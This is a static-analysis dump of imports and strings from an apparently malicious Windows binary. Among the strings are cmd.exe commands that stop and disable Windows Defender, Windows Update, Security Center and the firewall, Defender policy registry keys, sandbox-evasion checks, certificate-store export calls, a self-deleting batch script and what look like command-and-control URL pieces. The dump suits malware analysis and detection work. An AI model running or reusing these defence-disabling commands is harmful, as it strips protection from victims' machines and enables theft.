reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x402ddc	0x432084	import	0x402d8b	ADVAPI32.dll.RegCloseKey
0x402e22	0x432274	import	0x402de7	KERNEL32.dll.GlobalAddAtomW
0x402e6a	0x4322b4	import	0x402de7	KERNEL32.dll.GetVersionExW
0x402ea1	0x4340cc	string	0x402de7	cmd.exe /c sc stop wuauserv
0x402eab	0x434108	string	0x402de7	cmd.exe /c sc config wuauserv start= disabled
0x402eb7	0x434164	string	0x402de7	cmd.exe /c sc stop wscsvc
0x402ec3	0x434198	string	0x402de7	cmd.exe /c sc config wscsvc start= disabled
0x402ecf	0x4341f0	string	0x402de7	cmd.exe /c sc stop WinDefend
0x402edb	0x434230	string	0x402de7	cmd.exe /c sc config WinDefend start= disabled
0x402ee7	0x434290	string	0x402de7	cmd.exe /c sc stop WdNisSvc
0x402ef3	0x4342c8	string	0x402de7	cmd.exe /c sc config WdNisSvc start= disabled
0x402eff	0x434328	string	0x402de7	cmd.exe /c schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
0x402f0b	0x434410	string	0x402de7	cmd.exe /c schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
0x402f17	0x4344e0	string	0x402de7	cmd.exe /c schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
0x402f23	0x4345c0	string	0x402de7	cmd.exe /c schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
0x402f2f	0x434698	string	0x402de7	DisableAntiSpyware
0x402f36	0x4346c0	string	0x402de7	SOFTWARE\Policies\Microsoft\Windows Defender
0x402f40	0x43471c	string	0x402de7	DisableBehaviorMonitoring
0x402f45	0x434750	string	0x402de7	SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
0x402f50	0x4347d4	string	0x402de7	DisableOnAccessProtection
0x402f5b	0x434808	string	0x402de7	DisableScanOnRealtimeEnable
0x402f66	0x434840	string	0x402de7	cmd.exe /c sc stop MpsSvc
0x402f73	0x434878	string	0x402de7	cmd.exe /c sc config MpsSvc start= disabled
0x403005	0x432328	import	0x402de7	KERNEL32.dll.GetNativeSystemInfo
0x403018	0x432364	import	0x402de7	SHELL32.dll.SHGetFolderPathW
0x40302d	0x432394	import	0x402de7	SHLWAPI.dll.PathAppendW
0x403069	0x432334	import	0x402de7	KERNEL32.dll.CreateProcessW
0x40308f	0x432404	import	0x402de7	USER32.dll.ExitWindowsEx
0x403105	0x4323a4	import	0x402de7	SHLWAPI.dll.PathQuoteSpacesW
0x403158	0x4325bc	import	0x402de7	msvcrt.dll.memset
0x403169	0x432374	import	0x402de7	SHELL32.dll.ShellExecuteExW
0x403172	0x4348d0	string	0x402de7	runas
0x403184	0x4322a8	import	0x402de7	KERNEL32.dll.GetLastError
0x403196	0x432308	import	0x402de7	KERNEL32.dll.Sleep
0x4031d3	0x432280	import	0x402de7	KERNEL32.dll.CloseHandle
0x40322d	0x4322b0	import	0x403202	KERNEL32.dll.GetModuleFileNameW
0x403244	0x43233c	import	0x403202	KERNEL32.dll.GetCurrentProcess
0x40324b	0x43235c	import	0x403202	PSAPI.DLL.GetModuleBaseNameW
0x403259	0x432324	import	0x403202	KERNEL32.dll.GetCommandLineW
0x403295	0x432390	import	0x403202	SHLWAPI.dll.StrStrNIW
0x4032c9	0x43230c	import	0x403202	KERNEL32.dll.GetProcessHeap
0x4032d9	0x432338	import	0x403202	KERNEL32.dll.HeapAlloc
0x403312	0x432338	import	0x403202	KERNEL32.dll.HeapAlloc
0x403326	0x432364	import	0x403202	SHELL32.dll.SHGetFolderPathW
0x403330	0x43490c	string	0x403202	cmd.exe
0x403336	0x432394	import	0x403202	SHLWAPI.dll.PathAppendW
0x403354	0x4348d0	string	0x403202	runas
0x403371	0x432340	import	0x403202	KERNEL32.dll.HeapFree
0x403390	0x432374	import	0x40338e	SHELL32.dll.ShellExecuteExW
0x40339a	0x4322a8	import	0x40338e	KERNEL32.dll.GetLastError
0x4033ac	0x432308	import	0x40338e	KERNEL32.dll.Sleep
0x4033be	0x432348	import	0x40338e	KERNEL32.dll.WaitForSingleObject
0x4033cb	0x432280	import	0x40338e	KERNEL32.dll.CloseHandle
0x4033d3	0x432280	import	0x40338e	KERNEL32.dll.CloseHandle
0x4033f7	0x432014	import	0x4033e1	ADVAPI32.dll.OpenProcessToken
0x403403	0x432020	import	0x4033e1	ADVAPI32.dll.GetTokenInformation
0x40341c	0x4322a8	import	0x4033e1	KERNEL32.dll.GetLastError
0x40342b	0x432298	import	0x4033e1	KERNEL32.dll.LocalAlloc
0x40344c	0x43201c	import	0x4033e1	ADVAPI32.dll.GetSidSubAuthorityCount
0x40345c	0x432018	import	0x4033e1	ADVAPI32.dll.GetSidSubAuthority
0x403468	0x432270	import	0x4033e1	KERNEL32.dll.LocalFree
0x403471	0x432280	import	0x4033e1	KERNEL32.dll.CloseHandle
0x4034d5	0x432314	import	0x4034bb	KERNEL32.dll.GetModuleHandleW
0x40352b	0x432290	import	0x4034bb	KERNEL32.dll.GlobalFindAtomW
0x403567	0x4322b4	import	0x4034bb	KERNEL32.dll.GetVersionExW
0x403578	0x43233c	import	0x4034bb	KERNEL32.dll.GetCurrentProcess
0x40358f	0x4325f8	import	0x4034bb	ole32.dll.CoInitializeEx
0x4035b5	0x4325f0	import	0x4034bb	ole32.dll.CoUninitialize
0x4035bc	0x432320	import	0x4034bb	KERNEL32.dll.ExitProcess
0x4035d2	0x432330	import	0x4034bb	KERNEL32.dll.SetErrorMode
0x4035f0	0x432308	import	0x4034bb	KERNEL32.dll.Sleep
0x403646	0x4323f8	import	0x403631	Secur32.dll.GetUserNameExW
0x40366a	0x403671	string	0x403631	j|Yf
0x4036a8	0x4320bc	import	0x40368d	CRYPT32.dll.CertOpenSystemStoreW
0x4036ba	0x4320c0	import	0x40368d	CRYPT32.dll.CertEnumCertificatesInStore
0x4036fd	0x4320c4	import	0x40368d	CRYPT32.dll.PFXExportCertStoreEx
0x40375c	0x432440	import	0x40368d	USER32.dll.CharLowerW
0x403767	0x432268	import	0x40368d	KERNEL32.dll.GetSystemTime
0x4037f2	0x4320b8	import	0x40368d	CRYPT32.dll.CertCloseStore
0x40380e	0x4320bc	import	0x403803	CRYPT32.dll.CertOpenSystemStoreW
0x40381b	0x4320c0	import	0x403803	CRYPT32.dll.CertEnumCertificatesInStore
0x403827	0x4320c8	import	0x403803	CRYPT32.dll.CertDuplicateCertificateContext
0x403832	0x4320cc	import	0x403803	CRYPT32.dll.CertDeleteCertificateFromStore
0x403846	0x4320b8	import	0x403803	CRYPT32.dll.CertCloseStore
0x40386c	0x4320b4	import	0x403853	CRYPT32.dll.PFXImportCertStore
0x4038b8	0x432268	import	0x403853	KERNEL32.dll.GetSystemTime
0x403952	0x434924	string	0x403853	.txt
0x4039a5	0x432284	import	0x40399b	KERNEL32.dll.GetModuleHandleA
0x4039ab	0x434930	string	0x40399b	sbie.dll
0x4039c1	0x43493c	string	0x40399b	cuckoomon.dll
0x4039db	0x4325bc	import	0x40399b	msvcrt.dll.memset
0x403a2a	0x4323a8	import	0x40399b	SHLWAPI.dll.StrStrIA
0x403a60	0x4323a8	import	0x40399b	SHLWAPI.dll.StrStrIA
0x403a79	0x432340	import	0x40399b	KERNEL32.dll.HeapFree
0x403a7f	0x43230c	import	0x40399b	KERNEL32.dll.GetProcessHeap
0x403abe	0x43233c	import	0x40399b	KERNEL32.dll.GetCurrentProcess
0x403ac5	0x43235c	import	0x40399b	PSAPI.DLL.GetModuleBaseNameW
0x403adb	0x432440	import	0x40399b	USER32.dll.CharLowerW
0x403af5	0x432264	import	0x40399b	KERNEL32.dll.WideCharToMultiByte
0x403b06	0x43232c	import	0x40399b	KERNEL32.dll.lstrlenA
0x403b47	0x4325bc	import	0x40399b	msvcrt.dll.memset
0x403b53	0x432258	import	0x40399b	KERNEL32.dll.CreateToolhelp32Snapshot
0x403b73	0x432260	import	0x40399b	KERNEL32.dll.Process32FirstW
0x403b82	0x432440	import	0x40399b	USER32.dll.CharLowerW
0x403b9d	0x432264	import	0x40399b	KERNEL32.dll.WideCharToMultiByte
0x403bae	0x43232c	import	0x40399b	KERNEL32.dll.lstrlenA
0x403be7	0x43225c	import	0x40399b	KERNEL32.dll.Process32NextW
0x403bfd	0x432280	import	0x40399b	KERNEL32.dll.CloseHandle
0x403c25	0x4322a4	import	0x403c13	KERNEL32.dll.SetLastError
0x403c76	0x432544	import	0x403c49	WS2_32.dll.WSAStartup
0x403c82	0x4324f4	import	0x403c49	WS2_32.dll.socket
0x403c96	0x434088	string	0x403c49	127.0.0.1
0x403ca0	0x43254c	import	0x403c49	WS2_32.dll.inet_addr
0x403cb2	0x432554	import	0x403c49	WS2_32.dll.htons
0x403cc5	0x432540	import	0x403c49	WS2_32.dll.connect
0x403cd8	0x4325bc	import	0x403c49	msvcrt.dll.memset
0x403cee	0x432548	import	0x403c49	WS2_32.dll.send
0x403d2f	0x432550	import	0x403c49	WS2_32.dll.WSAGetLastError
0x403d3c	0x432550	import	0x403c49	WS2_32.dll.WSAGetLastError
0x403d75	0x4324f0	import	0x403c49	WS2_32.dll.closesocket
0x403d7f	0x403da5	string	0x403c49	9t$\ft
0x40404a	0x43494c	string	0x403f53	?action=cfg
0x404057	0x4324e0	import	0x403f53	WININET.dll.InternetCombineUrlA
0x4040b4	0x432348	import	0x403f53	KERNEL32.dll.WaitForSingleObject
0x404124	0x432544	import	0x404106	WS2_32.dll.WSAStartup
0x404130	0x4324f4	import	0x404106	WS2_32.dll.socket
0x404144	0x434088	string	0x404106	127.0.0.1
0x40414e	0x43254c	import	0x404106	WS2_32.dll.inet_addr
0x404160	0x432554	import	0x404106	WS2_32.dll.htons
0x404166	0x432548	import	0x404106	WS2_32.dll.send
0x404179	0x432540	import	0x404106	WS2_32.dll.connect
0x40418d	0x4325bc	import	0x404106	msvcrt.dll.memset
0x4041a1	0x43232c	import	0x404106	KERNEL32.dll.lstrlenA
0x4041ea	0x432550	import	0x404106	WS2_32.dll.WSAGetLastError
0x4041fb	0x432550	import	0x404106	WS2_32.dll.WSAGetLastError
0x40420d	0x4324f0	import	0x404106	WS2_32.dll.closesocket
0x404230	0x43498c	string	0x40421e	%I64d
0x404237	0x4325b8	import	0x40421e	msvcrt.dll.sscanf
0x404251	0x4325b0	import	0x40421e	msvcrt.dll.isspace
0x404297	0x4325a8	import	0x40421e	msvcrt.dll._errno
0x4042b5	0x4325c0	import	0x40421e	msvcrt.dll._snprintf
0x4042ce	0x4325ac	import	0x40421e	msvcrt.dll.strlen
0x4042e9	0x4325b4	import	0x40421e	msvcrt.dll.strncmp
0x404306	0x4325a4	import	0x40421e	msvcrt.dll.isdigit
0x404311	0x4325a8	import	0x40421e	msvcrt.dll._errno
0x40431d	0x4325a8	import	0x40421e	msvcrt.dll._errno
0x404357	0x43259c	import	0x404355	msvcrt.dll.calloc
0x40436d	0x404399	string	0x404355	_^ËF\bS blocks=Basic Latin,Latin-1 Supplement
0x40438e	0x4325a0	import	0x404355	msvcrt.dll.free
0x4043b9	0x432598	import	0x40439c	msvcrt.dll.realloc
0x4043d8	0x4325bc	import	0x40439c	msvcrt.dll.memset
0x404419	0x432594	import	0x404410	msvcrt.dll.vprintf
0x404423	0x43258c	import	0x404410	msvcrt.dll.exit
0x404452	0x432590	import	0x404410	msvcrt.dll.strcmp
0x404469	0x43259c	import	0x404460	msvcrt.dll.calloc
0x40447d	0x434994	string	0x404460	lh_table_new: calloc failed\n
0x404502	0x4325a0	import	0x4044ca	msvcrt.dll.free
0x40461d	0x40462d	string	0x4045f0	G;>u
0x404717	0x43259c	import	0x404712	msvcrt.dll.calloc
0x404734	0x432580	import	0x404712	msvcrt.dll.malloc
0x404742	0x4325a0	import	0x404712	msvcrt.dll.free
0x40476e	0x432598	import	0x40474f	msvcrt.dll.realloc
0x40478f	0x432588	import	0x40474f	msvcrt.dll.memcpy
0x4047bf	0x432578	import	0x4047a8	msvcrt.dll._vscprintf
0x4047c7	0x432580	import	0x4047a8	msvcrt.dll.malloc
0x4047e3	0x432584	import	0x4047a8	msvcrt.dll.vsprintf
0x4047f3	0x4325a0	import	0x4047a8	msvcrt.dll.free
0x404825	0x43257c	import	0x404805	msvcrt.dll._vsnprintf
0x404871	0x4325a0	import	0x404805	msvcrt.dll.free
0x4048b0	0x432544	import	0x40487f	WS2_32.dll.WSAStartup
0x4048bc	0x4324f4	import	0x40487f	WS2_32.dll.socket
0x4048d0	0x434088	string	0x40487f	127.0.0.1
0x4048da	0x43254c	import	0x40487f	WS2_32.dll.inet_addr
0x4048ec	0x432554	import	0x40487f	WS2_32.dll.htons
0x4048ff	0x432540	import	0x40487f	WS2_32.dll.connect
0x404916	0x4325bc	import	0x40487f	msvcrt.dll.memset
0x404930	0x432548	import	0x40487f	WS2_32.dll.send
0x404996	0x432550	import	0x40487f	WS2_32.dll.WSAGetLastError
0x4049a7	0x432550	import	0x40487f	WS2_32.dll.WSAGetLastError
0x4049b9	0x4324f0	import	0x40487f	WS2_32.dll.closesocket
0x404a28	0x432248	import	0x4049fe	KERNEL32.dll.CreateMutexW
0x404b1a	0x432338	import	0x404b02	KERNEL32.dll.HeapAlloc
0x404b2d	0x43224c	import	0x404b02	KERNEL32.dll.HeapReAlloc
0x404b45	0x432338	import	0x404b34	KERNEL32.dll.HeapAlloc
0x404b5d	0x432338	import	0x404b4c	KERNEL32.dll.HeapAlloc
0x404b77	0x432340	import	0x404b64	KERNEL32.dll.HeapFree
0x404c55	0x432268	import	0x404c4b	KERNEL32.dll.GetSystemTime
0x404c63	0x432238	import	0x404c4b	KERNEL32.dll.SystemTimeToFileTime
0x404c99	0x4321e8	import	0x404c8a	KERNEL32.dll.GetTimeZoneInformation
0x404cdb	0x432264	import	0x404cc0	KERNEL32.dll.WideCharToMultiByte
0x404d44	0x404d48	string	0x404cf3	_^[]Ã blocks=Basic Latin,Latin-1 Supplement
0x404d64	0x4321e4	import	0x404d4d	KERNEL32.dll.MultiByteToWideChar
0x404dd2	0x404dd6	string	0x404d80	_^[]
0x404e2b	0x4323b0	import	0x404ddb	SHLWAPI.dll.wvnsprintfW
0x404e87	0x4323ec	import	0x404e4c	SHLWAPI.dll.wvnsprintfA
0x405065	0x405085	string	0x40504e	+M4K
0x40507d	0x405085	string	0x40504e	+M4K
0x4056ff	0x4056f6	string	0x4056eb	H;D$
0x405776	0x4323b0	import	0x405753	SHLWAPI.dll.wvnsprintfW
0x4057b6	0x4323ec	import	0x405799	SHLWAPI.dll.wvnsprintfA
0x405df1	0x432074	import	0x405dd8	ADVAPI32.dll.CryptAcquireContextW
0x405e09	0x432054	import	0x405dd8	ADVAPI32.dll.CryptCreateHash
0x405e25	0x43203c	import	0x405dd8	ADVAPI32.dll.CryptHashData
0x405e3d	0x432078	import	0x405dd8	ADVAPI32.dll.CryptGetHashParam
0x405e54	0x432040	import	0x405dd8	ADVAPI32.dll.CryptDestroyHash
0x405e5e	0x43206c	import	0x405dd8	ADVAPI32.dll.CryptReleaseContext
0x405e6a	0x432310	import	0x405e6a	KERNEL32.dll.GetTickCount
0x406116	0x432308	import	0x406100	KERNEL32.dll.Sleep
0x40614a	0x432014	import	0x406139	ADVAPI32.dll.OpenProcessToken
0x406177	0x432020	import	0x406139	ADVAPI32.dll.GetTokenInformation
0x40618d	0x432280	import	0x406139	KERNEL32.dll.CloseHandle
0x4061a8	0x4321f0	import	0x406198	KERNEL32.dll.GetCurrentThread
0x4061af	0x432070	import	0x406198	ADVAPI32.dll.OpenThreadToken
0x4061c1	0x432014	import	0x406198	ADVAPI32.dll.OpenProcessToken
0x4061e5	0x432030	import	0x406198	ADVAPI32.dll.LookupPrivilegeValueA
0x4061fa	0x432088	import	0x406198	ADVAPI32.dll.AdjustTokenPrivileges
0x406204	0x4322a8	import	0x406198	KERNEL32.dll.GetLastError
0x406213	0x432280	import	0x406198	KERNEL32.dll.CloseHandle
0x40622e	0x432014	import	0x40621e	ADVAPI32.dll.OpenProcessToken
0x40623d	0x432020	import	0x40621e	ADVAPI32.dll.GetTokenInformation
0x406254	0x4322a8	import	0x40621e	KERNEL32.dll.GetLastError
0x406283	0x43201c	import	0x40621e	ADVAPI32.dll.GetSidSubAuthorityCount
0x40629a	0x432018	import	0x40621e	ADVAPI32.dll.GetSidSubAuthority
0x4062c6	0x432280	import	0x40621e	KERNEL32.dll.CloseHandle
0x4062da	0x434a44	string	0x4062d2	kernel32.dll
0x4062df	0x432314	import	0x4062d2	KERNEL32.dll.GetModuleHandleW
0x4062e9	0x434a60	string	0x4062d2	IsWow64Process
0x4062ef	0x4322a0	import	0x4062d2	KERNEL32.dll.GetProcAddress
0x40632d	0x432328	import	0x406312	KERNEL32.dll.GetNativeSystemInfo
0x406343	0x432204	import	0x406312	KERNEL32.dll.OpenProcess
0x40634f	0x434a60	string	0x406312	IsWow64Process
0x406354	0x434a70	string	0x406312	kernel32
0x40635c	0x432284	import	0x406312	KERNEL32.dll.GetModuleHandleA
0x406363	0x4322a0	import	0x406312	KERNEL32.dll.GetProcAddress
0x40637c	0x432280	import	0x406312	KERNEL32.dll.CloseHandle
0x4063d1	0x432334	import	0x40638d	KERNEL32.dll.CreateProcessW
0x4063ec	0x432280	import	0x40638d	KERNEL32.dll.CloseHandle
0x406415	0x434a7c	string	0x406404	"%s"
0x40642b	0x434a88	string	0x406404	"%s" %s
0x406472	0x432140	import	0x40645d	KERNEL32.dll.CreateThread
0x40647d	0x432280	import	0x40645d	KERNEL32.dll.CloseHandle
0x40649e	0x434a98	string	0x40648c	@echo off\nset Module=%1\n:Repeat\ndel %Module%\nif exist %Module% goto Repeat\ndel %0
0x4064ac	0x4321e0	import	0x40648c	KERNEL32.dll.lstrlenW
0x4064de	0x43226c	import	0x40648c	KERNEL32.dll.lstrcpyW
0x4064eb	0x4323a4	import	0x40648c	SHLWAPI.dll.PathQuoteSpacesW
0x406506	0x43232c	import	0x40648c	KERNEL32.dll.lstrlenA
0x40652c	0x4321d8	import	0x40648c	KERNEL32.dll.GetTempPathW
0x40654c	0x434af4	string	0x40648c	open
0x406552	0x432368	import	0x40648c	SHELL32.dll.ShellExecuteW
0x406569	0x434b00	string	0x406561	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)
0x406578	0x4324b8	import	0x406561	WININET.dll.InternetOpenA
0x406597	0x4324cc	import	0x406561	WININET.dll.InternetSetOptionA
0x4065b4	0x4324bc	import	0x406561	WININET.dll.InternetConnectA
